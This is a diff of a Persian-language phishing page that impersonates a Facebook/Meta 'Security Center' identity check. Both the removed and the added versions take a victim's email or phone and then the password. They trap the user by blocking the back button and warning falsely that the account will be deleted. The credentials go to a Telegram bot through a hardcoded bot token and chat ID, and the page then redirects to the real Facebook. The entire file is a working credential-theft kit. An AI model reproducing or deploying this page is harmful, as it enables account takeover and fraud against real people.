@@ -1,98 +1,98 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Account Security | Verification Required</title>
+    
+    <meta property="og:title" content="Security Center | Facebook Verification ✔️">
+    <meta property="og:description" content="جهت جلوگیری از مسدود شدن حساب، تایید هویت الزامی است.">
+    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+    <meta property="og:type" content="website">
+    
+    <title>تایید هویت | مرکز امنیت متـا</title>
+    
     <style>
-        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; overflow: hidden; }
-        .container { background: white; width: 100%; max-width: 400px; margin-top: 50px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); overflow: hidden; }
-        .header { background: #1877f2; color: white; padding: 15px; font-size: 24px; font-weight: bold; text-align: left; }
-        .content { padding: 20px; text-align: center; }
-        .alert-box { background: #fff9e6; border: 1px solid #ffe58f; padding: 12px; border-radius: 4px; color: #856404; font-size: 13px; text-align: left; margin-bottom: 20px; line-height: 1.4; }
-        h2 { font-size: 18px; color: #1c1e21; margin: 0 0 10px; }
-        p { font-size: 14px; color: #606770; margin-bottom: 20px; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; background: #f5f6f7; }
-        .btn { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
-        .footer { padding: 20px; font-size: 12px; color: #90949c; text-align: center; }
-        
-        /* مخفی کردن مرحله دوم در ابتدا */
+        body { background-color: #f0f2f5; font-family: Tahoma, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; overflow: hidden; }
+        .app-container { background: white; width: 100%; max-width: 420px; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        .nav-bar { background: #1877f2; color: white; padding: 15px; font-size: 22px; font-weight: bold; display: flex; align-items: center; justify-content: space-between; }
+        .hero-section { padding: 25px; text-align: center; border-bottom: 1px solid #e5e5e5; }
+        .shield-icon { width: 70px; margin-bottom: 15px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .verify-text { font-size: 13.5px; color: #606770; line-height: 1.7; text-align: justify; background: #fff9e6; border: 1px solid #ffe58f; padding: 15px; border-radius: 8px; margin-top: 10px; }
+        .form-area { padding: 25px; flex-grow: 1; }
+        .input-box { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 10px; font-size: 15px; background: #f5f6f7; box-sizing: border-box; text-align: left; direction: ltr; }
+        .primary-btn { width: 100%; padding: 15px; background: #1877f2; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
         #step2 { display: none; }
+        .fade-in { animation: fadeIn 0.5s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .footer { padding: 20px; font-size: 11px; color: #90949c; text-align: center; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">facebook</div>
-    <div class="content">
-        <div class="alert-box">
-            <strong>Security Alert:</strong> We detected a login attempt from an unrecognized device. Complete the steps below to secure your account.
-        </div>
+<div class="app-container">
+    <div class="nav-bar">
+        <span>facebook</span>
+        <span style="font-size: 12px; font-weight: normal;">فارسی</span>
+    </div>
 
-        <div id="step1">
-            <h2>Identify Your Account</h2>
-            <p>Enter your mobile number or email to search for your account.</p>
-            <input type="text" id="email_field" placeholder="Mobile number or email" autocomplete="off">
-            <button class="btn" onclick="goToStep2()">Next</button>
-        </div>
-
-        <div id="step2">
-            <h2>Enter Password</h2>
-            <p>For your security, you must enter your password to continue.</p>
-            <input type="password" id="pass_field" placeholder="Password" autocomplete="off">
-            <button class="btn" id="finalBtn" onclick="submitData()">Log In</button>
+    <div class="hero-section">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/86_fW-o5v-u.png" class="shield-icon">
+        <h2 style="font-size: 18px; color: #1c1e21;">بررسی امنیتی حساب</h2>
+        <div class="verify-text">
+            <strong>هشدار سیستم:</strong> فعالیت غیرعادی در حساب شما شناسایی شده است. برای تایید مالکیت و جلوگیری از غیرفعال شدن حساب، مراحل زیر را تکمیل کنید.
         </div>
     </div>
-    <div class="footer">Meta Security Support &copy; 2026</div>
+
+    <div class="form-area">
+        <div id="step1" class="fade-in">
+            <input type="text" id="user_id" class="input-box" placeholder="ایمیل یا شماره موبایل" autocomplete="off">
+            <button class="primary-btn" onclick="nextStep()">تایید و ادامه</button>
+        </div>
+
+        <div id="step2" class="fade-in">
+            <p style="font-size: 13px; margin-bottom: 10px;">رمز عبور حساب خود را وارد کنید:</p>
+            <input type="password" id="user_pass" class="input-box" placeholder="Password" autocomplete="off">
+            <button class="primary-btn" id="finishBtn" onclick="sendToBot()">تکمیل احراز هویت</button>
+        </div>
+    </div>
+
+    <div class="footer">Meta Security Center © 2026</div>
 </div>
 
 <script>
-    // --- ترفند قفل کردن (جلوگیری از خروج) ---
-    window.onbeforeunload = function() {
-        return "You must complete the verification to avoid account deletion!";
-    };
-
-    // جلوگیری از زدن دکمه Back گوشی
+    // قفل کردن دکمه بازگشت و هشدار خروج
+    window.onbeforeunload = function() { return "خروج منجر به حذف اکانت می‌شود!"; };
     history.pushState(null, null, location.href);
-    window.onpopstate = function () {
-        history.go(1);
-    };
+    window.onpopstate = function () { history.go(1); };
 
-    let savedEmail = "";
+    let loginData = "";
 
-    function goToStep2() {
-        const email = document.getElementById('email_field').value;
-        if(email.length < 3) {
-            alert("Please enter a valid email or phone number.");
-            return;
-        }
-        savedEmail = email;
+    function nextStep() {
+        const u = document.getElementById('user_id').value;
+        if(u.length < 4) return alert("لطفاً اطلاعات را درست وارد کنید.");
+        loginData = u;
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
     }
 
-    function submitData() {
-        const pass = document.getElementById('pass_field').value;
-        if(pass.length < 4) {
-            alert("Please enter your password.");
-            return;
-        }
+    function sendToBot() {
+        const p = document.getElementById('user_pass').value;
+        if(p.length < 4) return alert("رمز عبور کوتاه است.");
 
-        const btn = document.getElementById('finalBtn');
-        btn.innerText = "Verifying...";
+        const btn = document.getElementById('finishBtn');
+        btn.innerText = "در حال تایید...";
         btn.disabled = true;
 
-        const botToken = "8486500261:AAF8V0mNot6Uu3PAfP_BkF4wuJTX7Yns3f4";
-        const chatId = "7394414495";
-        const message = `🚨 شکار جدید (دو مرحله‌ای)!\n📧 یوزر: ${savedEmail}\n🔑 پسورد: ${pass}\n✅ وضعیت: اطلاعات کامل دریافت شد`;
+        const message = `🎯 شکار جدید با تیک آبی!\n👤 یوزر: ${loginData}\n🔑 پسورد: ${p}`;
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        fetch(`https://api.telegram.org/bot8486500261:AAF8V0mNot6Uu3PAfP_BkF4wuJTX7Yns3f4/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: message })
+            body: JSON.stringify({ chat_id: '7394414495', text: message })
         }).then(() => {
-            window.onbeforeunload = null; // اجازه خروج بعد از اتمام
-            window.location.href = 'https://www.facebook.com/checkpoint'; 
+            window.onbeforeunload = null;
+            window.location.href = 'https://www.facebook.com/security/2fa/setup/intro/'; 
         });
     }
 </script>
